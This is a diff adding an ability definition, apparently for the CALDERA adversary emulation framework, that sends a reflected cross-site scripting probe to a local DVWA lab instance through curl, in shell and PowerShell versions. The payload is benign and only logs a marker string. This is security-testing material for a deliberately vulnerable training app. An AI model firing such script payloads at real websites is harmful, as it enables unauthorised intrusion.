@@ -1,0 +1,30 @@
+- id: a1b2c3d4-dvwa-0008-xssr-000000000008
+  name: DVWA - XSS Reflected Probe (Low)
+  description: Submits reflected script payload to DVWA XSS Reflected endpoint
+  tactic: initial-access
+  technique_id: T1189
+  technique_name: Drive-by Compromise
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        PAYLOAD="%3Cscript%3Econsole.log%28%27CALDERA_XSS%27%29%3C%2Fscript%3E"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          "$DVWA_URL/vulnerabilities/xss_r/?name=$PAYLOAD" > /dev/null || true
+        echo "[+] Dispatched XSS Reflected test"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        $Payload = "%3Cscript%3Econsole.log%28%27CALDERA_XSS%27%29%3C%2Fscript%3E"
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          "$DvwaUrl/vulnerabilities/xss_r/?name=$Payload" | Out-Null
+        Write-Output "[+] Dispatched XSS Reflected test"
+        exit 0
+      timeout: 30
